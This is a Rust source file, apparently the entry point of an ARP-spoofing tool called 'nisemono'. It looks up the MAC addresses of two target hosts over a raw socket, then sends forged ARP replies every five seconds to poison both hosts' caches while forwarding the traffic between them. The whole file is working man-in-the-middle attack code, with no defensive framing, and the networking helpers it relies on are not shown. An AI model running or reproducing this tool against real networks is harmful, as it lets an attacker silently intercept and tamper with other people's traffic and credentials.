mod net;
mod ui;
use ansi_term::{Color, Style};
use smoltcp::phy::RawSocket;
use net::*;
use net::arp::*;
use std::env::args;
use std::net::Ipv4Addr;
use std::str::FromStr;
use std::{thread, time};
use mac_addr::MacAddr;

fn get_mac(target_ip: Ipv4Addr) -> MacAddr {
    let mut socket = RawSocket::new(&args().nth(1).unwrap()).unwrap();
    request::send(&mut socket, &target_ip.octets());

    request::get_target_mac(&mut socket, &target_ip)
}

fn arp_cache_poisoning(target_a_ip: Ipv4Addr, target_b_ip: Ipv4Addr, target_a_mac: MacAddr, target_b_mac: MacAddr) {
    let mut socket = RawSocket::new(&args().nth(1).unwrap()).unwrap();
    println!("{}", Color::Red.bold().paint("starting the ARP cache poisoning "));
    loop {
        reply::send(&mut socket, &target_a_ip.octets(), &target_a_mac.octets(), &target_b_ip.octets());
        reply::send(&mut socket, &target_b_ip.octets(), &target_b_mac.octets(), &target_a_ip.octets());
        thread::sleep(time::Duration::from_secs(5));
    }
}

fn forward(target_a_mac: MacAddr, target_b_mac: MacAddr) {
    let mut socket = RawSocket::new(&args().nth(1).unwrap()).unwrap();
    forwarding::listen(&mut socket, &target_a_mac.octets(), &target_b_mac.octets());
}

fn main() {
    ui::print_banner();

    if args().len() == 4 {
        let target_a_ip = args().nth(2).unwrap();
        let target_b_ip = args().nth(3).unwrap();

        let invalid_ips = utils::is_valid(&target_a_ip, &target_b_ip);
        if invalid_ips.is_empty() {
            if let Err(e) = RawSocket::new(&args().nth(1).unwrap()) {
                eprintln!("{} {}", Color::Red.bold().paint("error:"), e);
                return;
            }

            let target_a_ip = Ipv4Addr::from_str(&target_a_ip).unwrap();
            let target_b_ip = Ipv4Addr::from_str(&target_b_ip).unwrap();

            print!("{}", Color::Green.bold().paint("getting MAC addresses "));
            let thread_a = thread::spawn(move || get_mac(target_a_ip.clone()));
            let thread_b = thread::spawn(move || get_mac(target_b_ip.clone()));
            let target_a_mac = thread_a.join().unwrap();
            let target_b_mac = thread_b.join().unwrap();
            println!("{}", Color::Green.paint(" "));

            thread::spawn(move || arp_cache_poisoning(target_a_ip, target_b_ip, target_a_mac, target_b_mac));

            thread::spawn(move || forward(target_a_mac, target_b_mac)).join().unwrap();
        } else {
            for ip in invalid_ips {
                eprintln!("{} invalid IP address => {}", Color::Red.bold().paint("error:"), Style::new().bold().paint(ip));
            }
        }
    } else {
        eprintln!("usage: sudo ./nisemono <iface> <target_IP> <other_target_IP>");
    }
}
